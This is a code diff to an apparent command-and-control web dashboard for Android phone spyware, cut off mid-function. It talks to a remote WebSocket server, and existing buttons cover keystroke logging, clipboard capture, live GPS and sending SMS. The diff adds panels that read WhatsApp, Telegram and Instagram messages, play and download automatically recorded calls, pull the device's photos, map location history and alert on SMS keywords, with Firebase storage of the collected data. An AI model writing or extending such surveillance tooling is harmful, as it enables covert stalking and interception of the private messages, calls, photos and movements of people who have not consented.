@@ -577,12 +577,17 @@
     <div class="section">
         <div class="section-title">Monitoring</div>
         <button onclick="showAppUsagePanel()"><span>📊</span> Screen Time</button>
-        <button onclick="sendCommand('GET_NOTIFICATIONS')"><span>🔔</span> Social Messages</button>
+        <button onclick="showSocialMessagesPanel()"><span>💬</span> Social Messages</button>
         <button onclick="sendCommand('GET_KEYLOG')"><span>⌨️</span> Keyboard Log</button>
         <button onclick="sendCommand('GET_CLIPBOARD')"><span>📋</span> Clipboard</button>
         <button onclick="showGeofencePanel()"><span>🗺️</span> Geofence</button>
         <button onclick="showSchedulePanel()"><span>⏱️</span> Auto Capture</button>
         <button onclick="toggleLiveGps()" id="liveGpsBtn"><span>🛰️</span> <span>Live GPS Track</span></button>
+        <button onclick="showLocationHistoryPanel()"><span>📍</span> Location History</button>
+        <button onclick="showCallRecordingsPanel()"><span>🎙️</span> Call Recordings</button>
+        <button onclick="showPhotoGalleryPanel()"><span>🖼️</span> Photo Gallery</button>
+        <button onclick="showAppEventsPanel()"><span>📦</span> App Events</button>
+        <button onclick="showSmsKeywordsPanel()"><span>🔑</span> SMS Keywords</button>
     </div>
 
     <div class="section">
@@ -591,6 +596,7 @@
         <button onclick="sendCommand('LOCK_DEVICE')"><span>🔒</span> Lock Screen</button>
         <button onclick="showSendSmsPanel()"><span>✉️</span> Send SMS</button>
         <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> Vibrate (1s)</button>
+        <button onclick="showFirebaseSettingsPanel()" style="border-left:3px solid #ff6f00"><span>🔥</span> Firebase Setup</button>
     </div>
 
     <div id="alertsBadge" style="margin:10px 0;display:none;">
@@ -621,6 +627,10 @@
 <!-- Leaflet -->
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<!-- Firebase SDK v10 -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
 <script type="module">
     // ---------- GLOBALS ----------
     const WS_URL = "wss://mirror-view.onrender.com";   // keep as is – working endpoint
@@ -1212,6 +1222,77 @@
                 showNotification('GPS tracking stopped');
                 break;
             }
+            // ── Feature 1: Social Messages ─────────────────────────────────
+            case 'SOCIAL_MESSAGES_DATA':
+                displaySocialMessages(parseData(json.data));
+                pendingCommand = null;
+                break;
+            case 'NOTIFICATION_LIVE':
+                pushLiveNotification(json);
+                break;
+            // ── Feature 2: Call Recordings ─────────────────────────────────
+            case 'CALL_RECORDINGS_DATA':
+                displayCallRecordings(parseData(json.data));
+                pendingCommand = null;
+                break;
+            case 'CALL_AUDIO_DATA': {
+                const _aud = parseData(json.data);
+                if (_aud && _aud.audio) playCallRecording(_aud);
+                pendingCommand = null;
+                break;
+            }
+            case 'CALL_ALERT':
+                handleCallAlert(json);
+                break;
+            // ── Feature 3: Photo Gallery ───────────────────────────────────
+            case 'RECENT_IMAGES_DATA':
+                displayPhotoGallery(parseData(json.data));
+                pendingCommand = null;
+                break;
+            case 'IMAGE_DATA': {
+                const _img = parseData(json.data);
+                if (_img && _img.image) showFullImage(_img.image, _img.mediaId);
+                pendingCommand = null;
+                break;
+            }
+            // ── Feature 7: Location History ────────────────────────────────
+            case 'LOCATION_HISTORY_DATA':
+                displayLocationHistory(parseData(json.data));
+                pendingCommand = null;
+                break;
+            // ── Feature 5+6: App Events ────────────────────────────────────
+            case 'APP_EVENTS_DATA':
+                displayAppEvents(parseData(json.data));
+                pendingCommand = null;
+                break;
+            case 'APP_INSTALLED':
+                pushAlert('📱 App Installed', (json.name || json.pkg));
+                showNotification('📱 Installed: ' + (json.name || json.pkg));
+                break;
+            case 'APP_REMOVED':
+                pushAlert('🗑️ App Removed', (json.name || json.pkg));
+                showNotification('🗑️ Removed: ' + (json.name || json.pkg));
+                break;
+            // ── Feature 8: SMS Keywords ────────────────────────────────────
+            case 'SMS_KEYWORDS_SET':
+                showNotification('✅ Keywords saved: ' + json.data);
+                break;
+            case 'SMS_KEYWORDS_DATA':
+                displaySmsKeywords(parseData(json.data));
+                pendingCommand = null;
+                break;
+            case 'SMS_KEYWORDS_CLEARED':
+                showNotification('Keywords cleared');
+                break;
+            case 'SMS_ALERTS_DATA':
+                displaySmsAlerts(parseData(json.data));
+                pendingCommand = null;
+                break;
+            case 'SMS_KEYWORD_ALERT':
+                pushAlert('🔑 Keyword: ' + json.keyword,
+                    'From ' + json.from + ': ' + json.body);
+                showNotification('🔑 "' + json.keyword + '" from ' + json.from);
+                break;
             default:
                 console.log('Unhandled JSON type:', json.type);
                 if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
@@ -2242,6 +2323,618 @@ window.addEventListener('load', () => {
     }
 
 
+    // ══════════════════════════════════════════════════════════════════
+    // FEATURE 1: SOCIAL MESSAGES
+    // ══════════════════════════════════════════════════════════════════
+    let socialMsgsData = [];
+    let liveNotifCount = 0;
+
+    function showSocialMessagesPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3');
+        h3.textContent = '💬 Social Messages';
+        panel.appendChild(h3);
+        const filterRow = document.createElement('div');
+        filterRow.style.cssText = 'display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px';
+        [['All','ALL'],['WhatsApp','com.whatsapp'],['Telegram','org.telegram.messenger'],
+         ['Instagram','com.instagram.android']].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:4px 12px;background:#e3f2fd;color:#1976ff;border:1px solid #bbdefb;border-radius:12px;cursor:pointer;font-size:12px';
+            b.addEventListener('click', function() { filterSocialByPkg(item[1]); });
+            filterRow.appendChild(b);
+        });
+        const dayRow = document.createElement('div');
+        dayRow.style.cssText = 'display:flex;gap:8px;margin-bottom:12px';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:6px 14px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:12px';
+            b.addEventListener('click', function() {
+                loadHybrid('social_messages', item[1],
+                    'GET_SOCIAL_MESSAGES', {days: item[1]},
+                    displaySocialMessages, loadSocialFromFirebase);
+            });
+            dayRow.appendChild(b);
+        });
+        const note = document.createElement('p');
+        note.style.cssText = 'color:#999;font-size:12px;margin-bottom:8px';
+        note.textContent = 'Captures WhatsApp, Telegram, Instagram, Signal and others via Notification Access.';
+        const list = document.createElement('div'); list.id = 'socialMsgList';
+        panel.appendChild(filterRow); panel.appendChild(dayRow);
+        panel.appendChild(note); panel.appendChild(list);
+        loadHybrid('social_messages', 1, 'GET_SOCIAL_MESSAGES', {days:1},
+            displaySocialMessages, loadSocialFromFirebase);
+    }
+
+    function displaySocialMessages(data) {
+        const container = document.getElementById('socialMsgList') || panel;
+        container.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            container.innerHTML = '<p style="color:#999;padding:16px 0">No messages. Enable Notification Access on the device.</p>';
+            return;
+        }
+        socialMsgsData = data;
+        renderSocialMessages(data);
+    }
+
+    function renderSocialMessages(data) {
+        const container = document.getElementById('socialMsgList') || panel;
+        container.innerHTML = '';
+        data.forEach(function(n) {
+            const card = document.createElement('div');
+            card.dataset.pkg = n.pkg || '';
+            card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
+            const top = document.createElement('div');
+            top.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:4px';
+            const appSpan = document.createElement('span');
+            appSpan.style.cssText = 'font-weight:700;font-size:13px;color:#1976ff';
+            appSpan.textContent = n.app || '';
+            const timeSpan = document.createElement('span');
+            timeSpan.style.cssText = 'color:#aaa;font-size:11px';
+            timeSpan.textContent = n.timeFmt || '';
+            top.appendChild(appSpan); top.appendChild(timeSpan);
+            const sender = document.createElement('div');
+            sender.style.cssText = 'font-size:13px;font-weight:600;color:#333;margin-bottom:2px';
+            sender.textContent = n.sender || n.title || '';
+            const text = document.createElement('div');
+            text.style.cssText = 'font-size:13px;color:#555;line-height:1.4';
+            text.textContent = n.text || '';
+            card.appendChild(top); card.appendChild(sender); card.appendChild(text);
+            container.appendChild(card);
+        });
+    }
+
+    function filterSocialByPkg(pkg) {
+        if (!socialMsgsData.length) return;
+        const filtered = pkg === 'ALL' ? socialMsgsData
+            : socialMsgsData.filter(function(n) { return n.pkg === pkg; });
+        renderSocialMessages(filtered);
+    }
+
+    function pushLiveNotification(json) {
+        liveNotifCount++;
+        pushAlert('📳 ' + (json.app || 'App'), (json.title || '') + ': ' + (json.text || ''));
+        if (json.isSocial) {
+            showNotification('💬 ' + (json.app || '') + ': ' + ((json.text || '').substring(0, 40)));
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    // FEATURE 2: CALL RECORDINGS
+    // ══════════════════════════════════════════════════════════════════
+    function showCallRecordingsPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '🎙️ Call Recordings';
+        panel.appendChild(h3);
+        const note = document.createElement('p');
+        note.style.cssText = 'color:#ff9800;font-size:12px;margin-bottom:12px;background:#fff3e0;border-radius:6px;padding:8px';
+        note.textContent = '⚠️ On Xiaomi/MIUI: only mic audio captured. VOICE_CALL source requires stock Android or root.';
+        panel.appendChild(note);
+        const btnRow = document.createElement('div');
+        btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
+            b.addEventListener('click', function() {
+                loadHybrid('call_recordings', item[1],
+                    'GET_CALL_RECORDINGS', {days: item[1]},
+                    displayCallRecordings, loadCallRecordingsFromFirebase);
+            });
+            btnRow.appendChild(b);
+        });
+        panel.appendChild(btnRow);
+        const listDiv = document.createElement('div'); listDiv.id = 'callRecList';
+        listDiv.innerHTML = '<p style="color:#999">Loading...</p>';
+        panel.appendChild(listDiv);
+        loadHybrid('call_recordings', 5, 'GET_CALL_RECORDINGS', {days:5},
+            displayCallRecordings, loadCallRecordingsFromFirebase);
+    }
+
+    function displayCallRecordings(data) {
+        const container = document.getElementById('callRecList') || panel;
+        container.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            container.innerHTML = '<p style="color:#999">No recordings yet. Calls are recorded automatically.</p>';
+            return;
+        }
+        data.forEach(function(rec) {
+            const card = document.createElement('div');
+            card.style.cssText = 'background:#fff;border:1px solid #e0e0e0;border-radius:10px;padding:12px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px';
+            const left = document.createElement('div');
+            const dirIcon = rec.direction === 'INCOMING' ? '📞' : '📤';
+            const nameDiv = document.createElement('div');
+            nameDiv.style.cssText = 'font-weight:700;font-size:14px';
+            nameDiv.textContent = dirIcon + ' ' + (rec.name || rec.number || 'Unknown');
+            const detailDiv = document.createElement('div');
+            detailDiv.style.cssText = 'font-size:12px;color:#999;margin-top:2px';
+            detailDiv.textContent = (rec.number || '') + '  •  ' + (rec.duration || '') + '  •  ' + (rec.timeFmt || '');
+            left.appendChild(nameDiv); left.appendChild(detailDiv);
+            const playBtn = document.createElement('button');
+            playBtn.textContent = '▶ Play';
+            playBtn.style.cssText = 'padding:6px 14px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:13px';
+            playBtn.addEventListener('click', function() {
+                playBtn.textContent = '⏳';
+                sendCommand('GET_CALL_AUDIO', {id: rec.id, filePath: rec.filePath});
+            });
+            card.appendChild(left); card.appendChild(playBtn);
+            container.appendChild(card);
+        });
+    }
+
+    function handleCallAlert(json) {
+        if (json.event === 'RINGING') {
+            pushAlert('📞 Incoming Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')');
+            showNotification('📞 Incoming: ' + (json.name || json.number));
+        } else if (json.event === 'MISSED') {
+            pushAlert('📵 Missed Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')');
+            showNotification('📵 Missed: ' + (json.name || json.number));
+        } else {
+            pushAlert('🎙️ Call Recorded', (json.direction || '') + ' • ' + (json.number || '') + ' • ' + (json.duration || ''));
+        }
+    }
+
+    function playCallRecording(audioData) {
+        const modal = document.createElement('div');
+        modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999';
+        const box = document.createElement('div');
+        box.style.cssText = 'background:#fff;border-radius:16px;padding:24px;min-width:300px;max-width:90vw';
+        const title = document.createElement('h3'); title.style.margin='0 0 16px';
+        title.textContent = '🎙️ ' + (audioData.name || 'Call Recording');
+        const audioEl = document.createElement('audio');
+        audioEl.controls = true; audioEl.style.width = '100%';
+        audioEl.src = 'data:audio/mp4;base64,' + audioData.audio;
+        const dlBtn = document.createElement('button');
+        dlBtn.textContent = '💾 Download';
+        dlBtn.style.cssText = 'margin-top:12px;padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;margin-right:8px';
+        dlBtn.addEventListener('click', function() { downloadBase64(audioData.audio, audioData.name || 'recording.m4a'); });
+        const closeBtn = document.createElement('button');
+        closeBtn.textContent = '✕ Close';
+        closeBtn.style.cssText = 'margin-top:12px;padding:8px 16px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer';
+        closeBtn.addEventListener('click', function() { document.body.removeChild(modal); });
+        box.appendChild(title); box.appendChild(audioEl);
+        box.appendChild(dlBtn); box.appendChild(closeBtn);
+        modal.appendChild(box); document.body.appendChild(modal);
+        audioEl.play().catch(function() {});
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    // FEATURE 3: PHOTO GALLERY
+    // ══════════════════════════════════════════════════════════════════
+    function showPhotoGalleryPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '🖼️ Photo Gallery';
+        panel.appendChild(h3);
+        const btnRow = document.createElement('div');
+        btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
+            b.addEventListener('click', function() {
+                const grid = document.getElementById('photoGrid');
+                if (grid) grid.innerHTML = '<p style="color:#999;padding:20px">Loading...</p>';
+                loadHybrid('images_meta', item[1], 'GET_RECENT_IMAGES', {days: item[1]},
+                    displayPhotoGallery, loadImagesFromFirebase);
+            });
+            btnRow.appendChild(b);
+        });
+        panel.appendChild(btnRow);
+        const grid = document.createElement('div'); grid.id = 'photoGrid';
+        grid.style.cssText = 'display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px';
+        grid.innerHTML = '<p style="color:#999;padding:20px">Loading...</p>';
+        panel.appendChild(grid);
+        loadHybrid('images_meta', 5, 'GET_RECENT_IMAGES', {days:5},
+            displayPhotoGallery, loadImagesFromFirebase);
+    }
+
+    function displayPhotoGallery(data) {
+        const grid = document.getElementById('photoGrid');
+        if (!grid) return;
+        grid.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            grid.innerHTML = '<p style="color:#999">No images in last 5 days.</p>'; return;
+        }
+        data.forEach(function(img) {
+            const tile = document.createElement('div');
+            tile.style.cssText = 'position:relative;cursor:pointer;border-radius:8px;overflow:hidden;background:#f0f0f0;aspect-ratio:1';
+            if (img.thumb) {
+                const image = document.createElement('img');
+                image.src = 'data:image/jpeg;base64,' + img.thumb;
+                image.style.cssText = 'width:100%;height:100%;object-fit:cover;display:block';
+                tile.appendChild(image);
+            } else {
+                tile.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:32px">🖼️</div>';
+            }
+            const overlay = document.createElement('div');
+            overlay.style.cssText = 'position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.55);color:#fff;font-size:9px;padding:3px 4px';
+            overlay.textContent = img.dateFmt || '';
+            tile.appendChild(overlay);
+            tile.addEventListener('click', function() {
+                sendCommand('GET_IMAGE', {mediaId: img.id || img.mediaId, maxDim: 1200});
+                showNotification('Loading image...');
+            });
+            grid.appendChild(tile);
+        });
+    }
+
+    function showFullImage(b64, mediaId) {
+        const modal = document.createElement('div');
+        modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.92);display:flex;align-items:center;justify-content:center;z-index:99999;cursor:pointer';
+        const img = document.createElement('img');
+        img.src = 'data:image/jpeg;base64,' + b64;
+        img.style.cssText = 'max-width:95vw;max-height:90vh;object-fit:contain;border-radius:8px';
+        const dlBtn = document.createElement('button');
+        dlBtn.textContent = '💾 Save';
+        dlBtn.style.cssText = 'position:absolute;bottom:20px;left:50%;transform:translateX(-50%);padding:10px 24px;background:#1976ff;color:#fff;border:none;border-radius:10px;cursor:pointer;font-size:14px';
+        dlBtn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            downloadBase64(b64, 'photo_' + (mediaId || Date.now()) + '.jpg');
+        });
+        modal.appendChild(img); modal.appendChild(dlBtn);
+        modal.addEventListener('click', function() { document.body.removeChild(modal); });
+        document.body.appendChild(modal);
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    // FEATURE 7: LOCATION HISTORY
+    // ══════════════════════════════════════════════════════════════════
+    function showLocationHistoryPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '📍 Location History';
+        panel.appendChild(h3);
+        const note = document.createElement('p');
+        note.style.cssText = 'color:#666;font-size:12px;margin-bottom:10px';
+        note.textContent = 'GPS fixes logged automatically every 30 minutes.';
+        panel.appendChild(note);
+        const btnRow = document.createElement('div');
+        btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
+            b.addEventListener('click', function() {
+                loadHybrid('location_history', item[1],
+                    'GET_LOCATION_HISTORY', {days: item[1]},
+                    displayLocationHistory, loadLocationHistoryFromFirebase);
+            });
+            btnRow.appendChild(b);
+        });
+        panel.appendChild(btnRow);
+        const mapDiv = document.createElement('div'); mapDiv.id = 'historyMap';
+        mapDiv.style.cssText = 'width:100%;height:320px;border-radius:10px;margin-bottom:12px';
+        panel.appendChild(mapDiv);
+        const listDiv = document.createElement('div'); listDiv.id = 'historyList';
+        panel.appendChild(listDiv);
+        loadHybrid('location_history', 3, 'GET_LOCATION_HISTORY', {days:3},
+            displayLocationHistory, loadLocationHistoryFromFirebase);
+        setTimeout(function() {
+            try {
+                window._historyMap = L.map('historyMap').setView([20.5937, 78.9629], 5);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window._historyMap);
+            } catch(e) { console.warn('Map init:', e); }
+        }, 100);
+    }
+
+    function displayLocationHistory(data) {
+        const listDiv = document.getElementById('historyList');
+        if (!listDiv) return;
+        listDiv.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            listDiv.innerHTML = '<p style="color:#999">No history yet. Auto-logging starts on app connect.</p>';
+            return;
+        }
+        if (window._historyMap) {
+            try {
+                const coords = data.map(function(p) { return [p.lat, p.lon]; });
+                if (coords.length > 1) L.polyline(coords, {color:'#1976ff',weight:3}).addTo(window._historyMap);
+                data.forEach(function(p, i) {
+                    L.circleMarker([p.lat, p.lon], {
+                        radius: i === 0 ? 8 : 5,
+                        color: i === 0 ? '#d32f2f' : '#1976ff', fillOpacity: 0.8
+                    }).addTo(window._historyMap)
+                    .bindPopup('<b>' + (p.timeFmt || '') + '</b><br>' + (p.address || (p.lat.toFixed(4)+','+p.lon.toFixed(4))));
+                });
+                if (coords.length > 0) window._historyMap.setView(coords[0], 13);
+            } catch(e) { console.warn('Map plot:', e); }
+        }
+        const tbl = document.createElement('table');
+        tbl.style.cssText = 'width:100%;border-collapse:collapse;font-size:12px;margin-top:12px';
+        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">Time</th><th style="padding:8px;text-align:left">Location</th><th style="padding:8px">Map</th></tr></thead>';
+        const tbody = document.createElement('tbody');
+        data.forEach(function(p) {
+            const tr = document.createElement('tr'); tr.style.borderBottom = '1px solid #f0f0f0';
+            const td1 = document.createElement('td'); td1.style.cssText = 'padding:6px 8px;color:#999;white-space:nowrap;font-size:11px'; td1.textContent = p.timeFmt || '';
+            const td2 = document.createElement('td'); td2.style.padding = '6px 8px'; td2.textContent = p.address || (p.lat.toFixed(4)+', '+p.lon.toFixed(4));
+            const td3 = document.createElement('td'); td3.style.cssText = 'padding:6px 8px;text-align:center';
+            const a = document.createElement('a'); a.href = 'https://maps.google.com/?q='+p.lat+','+p.lon;
+            a.target = '_blank'; a.style.color = '#1976ff'; a.textContent = '📍';
+            td3.appendChild(a); tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
+            tbody.appendChild(tr);
+        });
+        tbl.appendChild(tbody); listDiv.appendChild(tbl);
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    // FEATURE 5+6: APP EVENTS (installs / call log)
+    // ══════════════════════════════════════════════════════════════════
+    function showAppEventsPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '📦 App & Call Events';
+        panel.appendChild(h3);
+        const note = document.createElement('p');
+        note.style.cssText = 'color:#666;font-size:12px;margin-bottom:12px';
+        note.textContent = 'App installs/removals and call events, logged automatically.';
+        panel.appendChild(note);
+        const btnRow = document.createElement('div');
+        btnRow.style.cssText = 'display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap';
+        [['Today',1],['3 Days',3],['5 Days',5]].forEach(function(item) {
+            const b = document.createElement('button');
+            b.textContent = item[0];
+            b.style.cssText = 'padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer';
+            b.addEventListener('click', function() {
+                loadHybrid('app_events', item[1],
+                    'GET_APP_EVENTS', {days: item[1]},
+                    displayAppEvents, loadAppEventsFromFirebase);
+            });
+            btnRow.appendChild(b);
+        });
+        panel.appendChild(btnRow);
+        const listDiv = document.createElement('div'); listDiv.id = 'appEventsList';
+        listDiv.innerHTML = '<p style="color:#999">Loading...</p>';
+        panel.appendChild(listDiv);
+        loadHybrid('app_events', 5, 'GET_APP_EVENTS', {days:5},
+            displayAppEvents, loadAppEventsFromFirebase);
+    }
+
+    function displayAppEvents(data) {
+        const container = document.getElementById('appEventsList') || panel;
+        container.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            container.innerHTML = '<p style="color:#999">No events yet.</p>'; return;
+        }
+        const iconMap = {INSTALLED:'📱',REMOVED:'🗑️',CALL_INCOMING:'📞',CALL_OUTGOING:'📤',CALL_MISSED:'📵'};
+        data.forEach(function(ev) {
+            const row = document.createElement('div');
+            row.style.cssText = 'display:flex;align-items:center;gap:12px;padding:10px;border-bottom:1px solid #f0f0f0';
+            const icon = document.createElement('span'); icon.style.cssText = 'font-size:22px;flex-shrink:0';
+            icon.textContent = iconMap[ev.type] || '📋';
+            const info = document.createElement('div'); info.style.flex = '1';
+            const name = document.createElement('div'); name.style.cssText = 'font-weight:600;font-size:13px';
+            name.textContent = ev.name || ev.pkg || ev.extra || ev.type;
+            const detail = document.createElement('div'); detail.style.cssText = 'font-size:11px;color:#999;margin-top:2px';
+            detail.textContent = ev.type + (ev.pkg ? '  •  '+ev.pkg : '') + '  •  ' + (ev.timeFmt || '');
+            info.appendChild(name); info.appendChild(detail);
+            row.appendChild(icon); row.appendChild(info);
+            container.appendChild(row);
+        });
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    // FEATURE 8: SMS KEYWORD ALERTS
+    // ══════════════════════════════════════════════════════════════════
+    function showSmsKeywordsPanel() {
+        panel.innerHTML = '';
+        const h3 = document.createElement('h3'); h3.textContent = '🔑 SMS Keyword Alerts';
+        panel.appendChild(h3);
+        const desc = document.createElement('p');
+        desc.style.cssText = 'color:#666;font-size:13px;margin-bottom:14px';
+        desc.textContent = 'Get instant alerts when an incoming SMS contains any of these words.';
+        panel.appendChild(desc);
+        const inputRow = document.createElement('div'); inputRow.style.cssText = 'display:flex;gap:8px;margin-bottom:14px';
+        const inp = document.createElement('input'); inp.id = 'kwInput'; inp.type = 'text';
+        inp.placeholder = 'e.g. drug, fight, bully (comma separated)';
+        inp.style.cssText = 'flex:1;padding:9px 12px;border:1px solid #ddd;border-radius:8px;font-size:13px';
+        const saveBtn = document.createElement('button'); saveBtn.textContent = '💾 Save';
+        saveBtn.style.cssText = 'padding:9px 18px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:600';
+        saveBtn.addEventListener('click', function() {
+            const raw = document.getElementById('kwInput').value.trim();
+            if (!raw) { showNotification('Enter at least one keyword'); return; }
+            const kws = raw.split(',').map(function(k) { return k.trim(); }).filter(function(k) { return k.length > 0; });
+            sendCommand('SET_SMS_KEYWORDS', {keywords: kws});
+        });
+        inputRow.appendChild(inp); inputRow.appendChild(saveBtn); panel.appendChild(inputRow);
+        const ctrlRow = document.createElement('div'); ctrlRow.style.cssText = 'display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap';
+        [['📋 View Current','GET_SMS_KEYWORDS',null,'#1976ff'],
+         ['🗑️ Clear All','CLEAR_SMS_KEYWORDS',null,'#d32f2f'],
+         ['⚠️ View Alerts','GET_SMS_ALERTS',{days:5},'#ff9800']
+        ].forEach(function(item) {
+            const b = document.createElement('button'); b.textContent = item[0];
+            b.style.cssText = 'padding:8px 14px;background:'+item[3]+';color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:12px';
+            b.addEventListener('click', function() { sendCommand(item[1], item[2] || {}); });
+            ctrlRow.appendChild(b);
+        });
+        panel.appendChild(ctrlRow);
+        const resultDiv = document.createElement('div'); resultDiv.id = 'kwResult';
+        panel.appendChild(resultDiv);
+    }
+
+    function displaySmsKeywords(data) {
+        const div = document.getElementById('kwResult') || panel;
+        div.innerHTML = '';
+        if (!Array.isArray(data) || data.length === 0) {
+            div.innerHTML = '<p style="color:#999">No keywords set.</p>'; return;
+        }
+        const h4 = document.createElement('h4'); h4.style.marginBottom = '10px';
+        h4.textContent = 'Active Keywords (' + data.length + ')';
+        div.appendChild(h4);
+        const tags = document.createElement('div'); tags.style.cssText = 'display:flex;flex-wrap:wrap;gap:8px';
+        data.forEach(function(kw) {
+            const tag = document.createElement('span');
+            tag.style.cssText = 'background:#e8f5e9;color:#2e7d32;border:1px solid #a5d6a7;border-radius:16px;padding:4px 12px;font-size:13px;font-weight:600';
+            tag.textContent = kw; tags.appendChild(tag);
+        });
+        div.appendChild(tags);
+    }
+
+    function displaySmsAlerts(data) {
+        const div = document.getElementById('kwResult') || panel;
+        div.innerHTML = '';
+        const h4 = document.createElement('h4'); h4.style.marginBottom = '10px';
+        h4.textContent = '⚠️ Alert History (' + (Array.isArray(data) ? data.length : 0) + ')';
+        div.appendChild(h4);
+        if (!Array.isArray(data) || data.length === 0) {
+            div.innerHTML += '<p style="color:#999">No alerts triggered yet.</p>'; return;
+        }
+        data.forEach(function(alert) {
+            const card = document.createElement('div');
+            card.style.cssText = 'background:#fff8e1;border:1px solid #ffcc02;border-radius:8px;padding:10px;margin-bottom:8px';
+            const top = document.createElement('div'); top.style.cssText = 'display:flex;justify-content:space-between;margin-bottom:4px';
+            const kw = document.createElement('span');
+            kw.style.cssText = 'background:#ff9800;color:#fff;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700';
+            kw.textContent = alert.keyword;
+            const time = document.createElement('span'); time.style.cssText = 'font-size:11px;color:#999'; time.textContent = alert.timeFmt || '';
+            top.appendChild(kw); top.appendChild(time);
+            const from = document.createElement('div'); from.style.cssText = 'font-size:12px;color:#555;margin-top:4px'; from.textContent = 'From: ' + (alert.from || '');
+            const body = document.createElement('div'); body.style.cssText = 'font-size:13px;color:#333;margin-top:4px'; body.textContent = alert.body || alert.message || '';
+            card.appendChild(top); card.appendChild(from); card.appendChild(body);
+            div.appendChild(card);
+        });
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    // FIREBASE HYBRID LOADER + FIRESTORE READERS
+    // ══════════════════════════════════════════════════════════════════
+    function loadHybrid(collection, days, wsCommand, wsParams, displayFn, firebaseFn) {
+        if (typeof firebase !== 'undefined' && typeof firebaseConfig !== 'undefined'
+                && firebaseConfig.apiKey && firebaseConfig.apiKey !== 'YOUR_API_KEY') {
+            firebaseFn(days, function(data, err) {
+                if (!err && data && data.length > 0) {
+                    showFbStatus('☁️ Firebase: ' + data.length + ' records');
+                    displayFn(data);
+                }
+            });
+        }
+        sendCommand(wsCommand, wsParams || {});
+    }
+
+    function showFbStatus(msg) {
+        let el = document.getElementById('fbStatusBar');
+        if (!el) {
+            el = document.createElement('div'); el.id = 'fbStatusBar';
+            el.style.cssText = 'position:fixed;bottom:12px;right:12px;background:rgba(25,118,210,0.9);color:#fff;padding:8px 14px;border-radius:20px;font-size:12px;z-index:9999;pointer-events:none;transition:opacity 0.3s';
+            document.body.appendChild(el);
+        }
+        el.textContent = msg; el.style.opacity = '1';
+        setTimeout(function() { el.style.opacity = '0'; }, 3000);
+    }
+
+    function formatTimestamp(ts, dateOnly) {
+        if (!ts) return '';
